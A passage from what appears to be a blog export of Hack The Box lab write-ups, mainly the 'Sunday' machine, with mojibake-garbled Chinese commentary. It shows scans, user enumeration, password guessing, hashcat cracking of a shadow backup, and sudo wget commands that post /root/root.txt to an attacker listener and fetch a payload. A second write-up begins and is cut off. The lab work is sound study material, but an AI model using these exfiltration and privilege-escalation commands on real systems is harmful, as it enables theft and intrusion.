Sunday","date":"2022-04-19T11:38:36.000Z","updated":"2023-05-20T03:13:44.000Z","comments":true,"path":"2022/04/19/Hackthebox - Sunday/","link":"","permalink":"http://www.lucifiel.com/2022/04/19/Hackthebox%20-%20Sunday/","excerpt":"","text":"Hackthebox - Sundayé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æ”¶é›†Nmapâ”Œâ”€â”€(rootğŸ’€lucifiel)-[/home/lucifiel] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.76 Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-14 12:51 CST Warning: 10.10.10.76 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.76 Host is up (0.14s latency). Not shown: 59990 filtered ports, 5540 closed ports PORT STATE SERVICE VERSION 79/tcp open finger? |_finger: No one logged on\\x0D | fingerprint-strings: | GenericLines: | No one logged on | GetRequest: | Login Name TTY Idle When Where | HTTP/1.0 ??? | HTTPOptions: | Login Name TTY Idle When Where | HTTP/1.0 ??? | OPTIONS ??? | Help: | Login Name TTY Idle When Where | HELP ??? | RTSPRequest: | Login Name TTY Idle When Where | OPTIONS ??? | RTSP/1.0 ??? | SSLSessionReq, TerminalServerCookie: |_ Login Name TTY Idle When Where 111/tcp open rpcbind 2-4 (RPC #100000) 515/tcp open printer? 6787/tcp open ssl/http Apache httpd 2.4.33 ((Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14) |_http-server-header: Apache/2.4.33 (Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14 | http-title: Solaris Dashboard |_Requested resource was https://10.10.10.76:6787/solaris/ | ssl-cert: Subject: commonName=sunday | Subject Alternative Name: DNS:sunday | Not valid before: 2021-12-08T19:40:00 |_Not valid after: 2031-12-06T19:40:00 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 22022/tcp open ssh OpenSSH 7.5 (protocol 2.0) 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port79-TCP:V=7.91%I=7%D=4/14%Time=6257A8F1%P=x86_64-pc-linux-gnu%r(Gene SF:ricLines,12,&quot;No\\x20one\\x20logged\\x20on\\r\\n&quot;)%r(GetRequest,93,&quot;Login\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20Name\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20TTY\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x2 SF:0\\x20When\\x20\\x20\\x20\\x20Where\\r\\n/\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nGET\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\ SF:?\\r\\nHTTP/1\\.0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:?\\?\\?\\r\\n&quot;)%r(Help,5D,&quot;Login\\x20\\x20\\x20\\x20\\x20\\x20\\x20Name\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20TTY\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x20\\x20When\\x20\\x20\\x20\\x20Where\\r\\nHELP\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\?\\?\\?\\r\\n&quot;)%r(HTTPOptions,93,&quot;Login\\x20\\x20\\x20\\x20\\x20\\x20\\x20Name\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20TTY\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x20\\x20When\\x20\\x20\\x20\\x20Where\\ SF:r\\n/\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nHTTP/1\\.0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nOPTIONS\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\n&quot;)%r(RTSPRequest,93,&quot;Login\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20Name\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20TTY\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x20\\x2 SF:0When\\x20\\x20\\x20\\x20Where\\r\\n/\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nOPTIONS\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nRTSP/1\\.0\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\n&quot;)%r(SS SF:LSessionReq,5D,&quot;Login\\x20\\x20\\x20\\x20\\x20\\x20\\x20Name\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20TTY\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20Idle\\x20\\x20\\x20\\x20When\\x20\\x20\\x20\\x20Where\\r\\n\\x16\\x03\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\?\\?\\?\\r\\n&quot;)%r(TerminalServerCookie,5D,&quot;Login\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20Name\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:TTY\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x20\\x20When\\x20\\x20 SF:\\x20\\x20Where\\r\\n\\x03\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\n&quot;); No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=4/14%OT=79%CT=5%CU=31867%PV=Y%DS=2%DC=T%G=Y%TM=6257AA5 OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S%TS= OS:7)OPS(O1=ST11M505NW2%O2=ST11M505NW2%O3=NNT11M505NW2%O4=ST11M505NW2%O5=ST OS:11M505NW2%O6=ST11M505)WIN(W1=FB1E%W2=FB1E%W3=FA38%W4=FA3B%W5=FA3B%W6=FFF OS:7)ECN(R=Y%DF=Y%T=3C%W=FAFA%O=M505NNSNW2%CC=Y%Q=)T1(R=Y%DF=Y%T=3C%S=O%A=S OS:+%F=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=3C%W=FA09%S=O%A=S+%F=AS%O=ST11M505NW OS:2%RD=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=N%T=40%W OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=) OS:T7(R=N)U1(R=Y%DF=N%T=FF%IPL=70%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE OS:(R=Y%DFI=Y%T=FF%CD=S) Network Distance: 2 hops TRACEROUTE (using port 1720/tcp) HOP RTT ADDRESS 1 142.34 ms 10.10.14.1 2 142.67 ms 10.10.10.76 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 498.43 seconds 79 ç«¯å£æœ‰ä¸€ä¸ª finger?ï¼Œæœ€åä¸€ä¸ªå­—æ¯æ˜¯å•¥å°±ä¸çŸ¥é“äº†å»æœæœçœ‹æœ‰æ²¡æœ‰æ¼æ´ Searchsploitâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# searchsploit finger ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- BSD 4.2 - &#39;fingerd&#39; Remote Buffer Overflow | bsd/remote/19039.txt cfingerd 1.4 - Format String (1) | linux/remote/20748.pl cfingerd 1.4 - Format String (2) | linux/remote/20749.c cfingerd 1.4.1/1.4.2/1.4.3 Utilities - Local Buffer Overflow (1) | unix/local/20962.pl cfingerd 1.4.1/1.4.2/1.4.3 Utilities - Local Buffer Overflow (2) | unix/local/20963.c cfingerd 1.4.1/1.4.2/1.4.3 Utilities - Local Buffer Overflow (3) | unix/local/20964.c Daniel Beckham The Finger Server 0.82 Beta - Pipe | cgi/remote/19745.txt FingerTec Fingerprint Reader - Remote Access and Remote Enrolment | hardware/remote/39227.txt GNU Ffingerd 1.19 - &#39;Username&#39; Validity Disclosure | unix/remote/20327.txt Granding MA300 - Traffic Sniffing Man In The Middle Fingerprint PIN Disclosure | multiple/remote/39292.pl Martin Schulze Cfingerd 1.4.2 - GECOS Buffer Overflow | freebsd/local/19504.c Morris Worm - fingerd Stack Buffer Overflow (Metasploit) | bsd/remote/45791.rb OpenVms 8.3 Finger Service - Stack Buffer Overflow | multiple/dos/32193.txt SDFingerD 1.1 - Failure To Drop Privileges Privilege Escalation | linux/local/22806.sh Windows TCPIP Finger Command - C2 Channel and Bypassing Security Software | windows/local/48815.txt zkfingerd 0.9.1 - &#39;say()&#39; Format String | linux/remote/22101.c zkfingerd SysLog 0.9.1 - Format String | linux/remote/22091.c ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Paper Title | Path ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Address Relay Fingerprinting (How to Use Often Discarded Bugs) | english/13193-address-relay-fing Automated Web Application Fingerprinting | docs/english/17538-automated-web Bitter Harvest: Systematically Fingerprinting Low- and Medium-interaction Honeypots at Internet Scale | docs/english/45365-bitter-harves [Portuguese] Web Apps Fingerprinting | portuguese/13683-[portuguese]-we [Spanish] El fingerprinting dentro de la seguridad web | docs/spanish/18421-[spanish]-el- ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- æœå‡ºæ¥çš„ç»“æœä¸å°‘ï¼Œé¦–å…ˆæ’é™¤æ‰ cfingerd ä»¥åŠå…¶ä»–çš„å¹²æ‰°ï¼Œå°±å‰©ä¸‹äº†ä¸€ä¸ª Morris Worm - fingerd Stack Buffer Overflow (Metasploit) å»å°è¯•ä¸€ä¸‹ Metasploitmsf6 &gt; search fingerd Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/bsd/finger/morris_fingerd_bof 1988-11-02 normal Yes Morris Worm fingerd Stack Buffer Overflow Interact with a module by name or index. For example info 0, use 0 or use exploit/bsd/finger/morris_fingerd_bof msf6 &gt; use 0 [*] Using configured payload bsd/vax/shell_reverse_tcp å»è®¾ç½®ä¸€ä¸‹é…ç½® msf6 exploit(bsd/finger/morris_fingerd_bof) &gt; show options Module options (exploit/bsd/finger/morris_fingerd_bof): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS 10.10.10.76 yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 79 yes The target port (TCP) Payload options (bsd/vax/shell_reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.10.14.7 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 @(#)fingerd.c 5.1 (Berkeley) 6/6/85 ç„¶åå»æ‰§è¡Œ msf6 exploit(bsd/finger/morris_fingerd_bof) &gt; exploit [-] 10.10.10.76:79 - Exploit failed: bsd/vax/shell_reverse_tcp: All encoders failed to encode. [*] Exploit completed, but no session was created. è¿™è¾¹æ˜¯å¤±è´¥äº†ï¼Œæˆ‘ä»¬å»çœ‹çœ‹æœ‰æ²¡æœ‰å…¶ä»–è„šæœ¬ msf6 exploit(bsd/finger/morris_fingerd_bof) &gt; search finger Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/rdp/cve_2019_0708_bluekeep_rce 2019-05-14 manual Yes CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After Free 1 auxiliary/scanner/finger/finger_users normal No Finger Service User Enumerator 2 auxiliary/server/browser_autopwn normal No HTTP Client Automatic Exploiter 3 exploit/bsd/finger/morris_fingerd_bof 1988-11-02 normal Yes Morris Worm fingerd Stack Buffer Overflow 4 auxiliary/gather/mybb_db_fingerprint 2014-02-13 normal Yes MyBB Database Fingerprint 5 exploit/windows/http/bea_weblogic_post_bof 2008-07-17 great Yes Oracle Weblogic Apache Connector POST Request Buffer Overflow 6 auxiliary/scanner/oracle/isqlplus_login normal No Oracle iSQL*Plus Login Utility 7 auxiliary/scanner/oracle/isqlplus_sidbrute normal No Oracle iSQLPlus SID Check 8 post/windows/gather/enum_putty_saved_sessions normal No PuTTY Saved Sessions Enumeration Module 9 auxiliary/scanner/smb/smb_version normal No SMB Version Detection 10 auxiliary/scanner/vmware/esx_fingerprint normal No VMWare ESX/ESXi Fingerprint Scanner Interact with a module by name or index. For example info 10, use 10 or use auxiliary/scanner/vmware/esx_fingerprint è¿™é‡Œæœ‰ä¸€ä¸ªæ‰«æç”¨æˆ·åçš„ auxiliary&#x2F;scanner&#x2F;finger&#x2F;finger_usersï¼Œå»å°è¯•ä¸€ä¸‹ msf6 auxiliary(scanner/finger/finger_users) &gt; show options Module options (auxiliary/scanner/finger/finger_users): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS 10.10.10.76 yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 79 yes The target port (TCP) THREADS 1 yes The number of concurrent threads (max one per host) USERS_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt yes The file that contains a list of default UNIX accounts. msf6 auxiliary(scanner/finger/finger_users) &gt; exploit [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: adm [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: ikeuser [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: lp [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: dladm [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: netadm [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: netcfg [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: dhcpserv [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: bin [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: daemon [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: ftp [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: noaccess [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: nobody [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: nobody4 [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: root [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: sshd [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: sys [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: aiuser [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: openldap [+] 10.10.10.76:79 - 10.10.10.76:79 Users found: adm, aiuser, bin, daemon, dhcpserv, dladm, ftp, ikeuser, lp, netadm, netcfg, noaccess, nobody, nobody4, openldap, root, sshd, sys [*] 10.10.10.76:79 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed æ¼æ´åˆ©ç”¨è¿™ä¸ªä¼¼ä¹ä¸å¥½ç”¨ï¼Œæˆ‘å»æ‰¾åˆ°äº†ä¸€ä¸ªè„šæœ¬ https://github.com/pentestmonkey/finger-user-enum.git ç„¶åå†æ‰§è¡Œè¯•è¯• ./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.76 | less -S Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum ) ---------------------------------------------------------- | Scan Information | ---------------------------------------------------------- Worker Processes ......... 5 Usernames file ........... /usr/share/seclists/Usernames/Names/names.txt Target count ............. 1 Username count ........... 10177 Target TCP port .......... 79 Query timeout ............ 5 secs Relay Server ............. Not used ######## Scan started at Thu Apr 14 01:51:49 2022 ######### access@10.10.10.76: access No Access User &lt; . . . . &gt;..nobody4 SunOS 4.x NFS Anonym &lt; . . . . &gt;.. admin@10.10.10.76: Login Name TTY Idle When Where..adm Admin &lt; . . . . &gt;..dladm Datalink Admin &lt; . . . . &gt;..netadm&gt; bin@10.10.10.76: bin ??? &lt; . . . . &gt;.. dee dee@10.10.10.76: Login Name TTY Idle When Where..dee ???..dee ???.. ike@10.10.10.76: ikeuser IKE Admin &lt; . . . . &gt;.. jo ann@10.10.10.76: Login Name TTY Idle When Where..ann ???..jo ???.. la verne@10.10.10.76: Login Name TTY Idle When Where..la ???..verne ???.. line@10.10.10.76: Login Name TTY Idle When Where..lp Line Printer Admin &lt; . . . . &gt;.. message@10.10.10.76: Login Name TTY Idle When Where..smmsp SendMail Message Sub &lt; . . . . &gt;.. miof mela@10.10.10.76: Login Name TTY Idle When Where..mela ???..miof ???.. root@10.10.10.76: root Super-User console &lt;Dec 19 10:30&gt;.. sammy@10.10.10.76: sammy ??? console &lt;Dec 19 08:35&gt;.. sunny@10.10.10.76: sunny ??? console &lt;Dec 19 09:56&gt;.. sys@10.10.10.76: sys ??? &lt; . . . . &gt;.. zsa zsa@10.10.10.76: Login Name TTY Idle When Where..zsa ???..zsa ???.. ######## Scan completed at Thu Apr 14 02:29:46 2022 ######### 15 results. 10177 queries in 2277 seconds (4.5 queries / sec) è¿™é‡Œæœ‰ä¸‰ä¸ªç”¨æˆ·ä¸ä¸€æ ·ï¼Œéƒ½æœ‰ç™»å½•ä¿¡æ¯ã€‚åˆ†åˆ«æ˜¯ rootã€sammyã€sunny æ ¹æ®é¶æœºå›¾åƒå’Œåå­—åˆ¤æ–­ï¼Œè´¦æˆ·åº”è¯¥æ˜¯ sunnyï¼Œå¯†ç å¯èƒ½æ˜¯ sunday â”Œâ”€â”€(rootğŸ’€lucifiel)-[/home/lucifiel/Desktop] â””â”€# ssh -p 22022 sunny@10.10.10.76 The authenticity of host &#39;[10.10.10.76]:22022 ([10.10.10.76]:22022)&#39; can&#39;t be established. ED25519 key fingerprint is SHA256:t3OPHhtGi4xT7FTt3pgi5hSIsfljwBsZAUOPVy8QyXc. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;[10.10.10.76]:22022&#39; (ED25519) to the list of known hosts. Password: Warning: 4 failed authentication attempts since last successful authentication. The latest at Thu Apr 14 06:59 2022. Last login: Sun Dec 19 09:56:51 2021 on console Oracle Corporation SunOS 5.11 11.4 Aug 2018 sunny@sunday:~$ whoami&amp;&amp;id sunny uid=101(sunny) gid=10(staff) æˆåŠŸè¿›å…¥ user æƒé™ sunny@sunday:/home/sammy$ cat user.txt a3d9498027ca5187ba1793943ee8a598 æˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶ æƒé™æå‡sunny@sunday:/home/sammy$ sudo -l ç”¨æˆ· sunny å¯ä»¥åœ¨ sunday ä¸Šè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š (root) NOPASSWD: /root/troll ä½¿ç”¨ sudo -l æŸ¥çœ‹äº†ä¸€ä¸‹æƒé™ï¼Œå‘ç°å¯ä»¥ä½¿ç”¨ root æƒé™è¿è¡Œ &#x2F;root&#x2F;troll è¿è¡Œä¸€ä¸‹çœ‹çœ‹ sunny@sunday:/home/sammy$ sudo /root/troll sudo: /root/trollï¼šæ‰¾ä¸åˆ°å‘½ä»¤ æç¤ºæ‰¾ä¸åˆ°ï¼Ÿé‚£æ‰¾æ‰¾å…¶ä»–è·¯å­ sunny@sunday:/backup$ ls agent22.backup shadow.backup sunny@sunday:/backup$ cat shadow.backup mysql:NP::::::: openldap:*LK*::::::: webservd:*LK*::::::: postgres:NP::::::: svctag:*LK*:6445:::::: nobody:*LK*:6445:::::: noaccess:*LK*:6445:::::: nobody4:*LK*:6445:::::: sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445:::::: sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636:::::: åœ¨ç›®å½• &#x2F;backup ä¸­æ‰¾åˆ°äº†ä¸€ä¸ª shadow.backup çš„æ–‡ä»¶ï¼Œæ‹¿åˆ°äº†ä¸€ä¸²hashï¼Œå»å°è¯•çˆ†ç ´ä¸€ä¸‹ echo $5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB &gt; hash ç„¶åå¼€å§‹çˆ†ç ´ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# hashcat -m 7400 hash /usr/share/wordlists/rockyou.txt hashcat (v6.1.1) starting... OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] ============================================================================================================================= * Device #1: pthread-Intel(R) Core(TM) i7-10510U CPU @ 1.80GHz, 2878/2942 MB (1024 MB allocatable), 4MCU Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Applicable optimizers applied: * Zero-Byte * Single-Hash * Single-Salt ATTENTION! Pure (unoptimized) backend kernels selected. Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance. If you want to switch to optimized backend kernels, append -O to your commandline. See the above message to find out about the exact limits. Watchdog: Hardware monitoring interface not found on your system. Watchdog: Temperature abort trigger disabled. Host memory required for this attack: 65 MB Dictionary cache hit: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 $5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:cooldude! Session..........: hashcat Status...........: Cracked Hash.Name........: sha256crypt $5$, SHA256 (Unix) Hash.Target......: $5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB Time.Started.....: Thu Apr 14 21:29:17 2022 (2 mins, 59 secs) Time.Estimated...: Thu Apr 14 21:32:16 2022 (0 secs) Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 1145 H/s (13.57ms) @ Accel:128 Loops:128 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests Progress.........: 203776/14344385 (1.42%) Rejected.........: 0/203776 (0.00%) Restore.Point....: 203264/14344385 (1.42%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000 Candidates.#1....: dadof3 -&gt; chs2009 Started: Thu Apr 14 21:28:48 2022 Stopped: Thu Apr 14 21:32:17 2022 å¾—åˆ°äº†å¯†ç  username = sammy password = cooldude! å»ç™»å½•ä¸€ä¸‹ sunny@sunday:~$ su sammy Password: sammy@sunday:~$ whoami&amp;&amp;id sammy uid=100(sammy) gid=10(staff) sammy@sunday:~$ sudo -l ç”¨æˆ· sammy å¯ä»¥åœ¨ sunday ä¸Šè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š (ALL) ALL (root) NOPASSWD: /usr/bin/wget ä½¿ç”¨ sudo -l æŸ¥çœ‹ä¸€ä¸‹æƒé™ï¼Œå‘ç°å¯ä»¥ä½¿ç”¨ root æƒé™è¿è¡Œ wgetï¼Œé‚£å°±å¥½åŠäº† æœ‰æ–¹æ¡ˆäº† ç„¶åä½¿ç”¨ wget çš„ â€“post-file æ‹¿æˆ‘ä»¬è¦çš„æ–‡ä»¶ sudo wget --post-file=/root/root.txt 10.10.14.2 sudo wget http://10.10.14.7/payload.sh -o /root/troll ç„¶åå›åˆ° sunny ç”¨æˆ·ï¼Œä½¿ç”¨ sudo &#x2F;root&#x2F;troll æ‰§è¡Œ sudo /root/troll ä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£åï¼Œå†æ‰§è¡Œè¿™æ¡å‘½ä»¤ nc -nvlp 80 â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nc -nvlp 80 listening on [any] 80 ... connect to [10.10.14.2] from (UNKNOWN) [10.10.10.76] 59151 POST / HTTP/1.1 User-Agent: Wget/1.19.5 (solaris2.11) Accept: */* Accept-Encoding: identity Host: 10.10.14.2 Connection: Keep-Alive Content-Type: application/x-www-form-urlencoded Content-Length: 33 fb40fab61d99d37536daeec0d97af9b8 æˆåŠŸè·å¾— root æƒé™çš„ flag æ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Valentine - Hackthebox","slug":"Hackthebox - Valentine","date":"2022-04-12T11:38:36.000Z","updated":"2023-05-20T03:24:49.000Z","comments":true,"path":"2022/04/12/Hackthebox - Valentine/","link":"","permalink":"http://www.lucifiel.com/2022/04/12/Hackthebox%20-%20Valentine/","excerpt":"","text":"Hackthebox - Valentineé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æ”¶é›†Nmapâ”Œâ”€â”€(rootğŸ’€lucifiel)-[/home/lucifiel] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.79 Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-12 14:15 CST Nmap scan report for 10.10.10.79 Host is up (0.14s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA) | 2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA) |_ 256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA) 80/tcp open http Apache httpd 2.2.22 ((Ubuntu)) |_http-server-header: Apache/2.2.22 (Ubuntu) |_http-title: Site doesn&#39;t have a title (text/html). 443/tcp open ssl/http Apache httpd 2.2.22 ((Ubuntu)) |_http-server-header: Apache/2.2.22 (Ubuntu) |_http-title: Site doesn&#39;t have a title (text/html). | ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US | Not valid before: 2018-02-06T00:45:25 |_Not valid after: 2019-02-06T00:45:25 |_ssl-date: 2022-04-12T06:19:55+00:00; +3m16s from scanner time. No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=4/12%OT=22%CT=1%CU=37713%PV=Y%DS=2%DC=T%G=Y%TM=6255194 OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=8)OPS OS:(O1=M505ST11NW4%O2=M505ST11NW4%O3=M505NNT11NW4%O4=M505ST11NW4%O5=M505ST1 OS:1NW4%O6=M505ST11)WIN(W1=3890%W2=3890%W3=3890%W4=3890%W5=3890%W6=3890)ECN OS:(R=Y%DF=Y%T=40%W=3908%O=M505NNSNW4%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=3890%S=O%A=S+%F=AS%O=M505ST11NW4%RD= OS:0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S= OS:Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R= OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%R OS:IPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: 3m15s TRACEROUTE (using port 53/tcp) HOP RTT ADDRESS 1 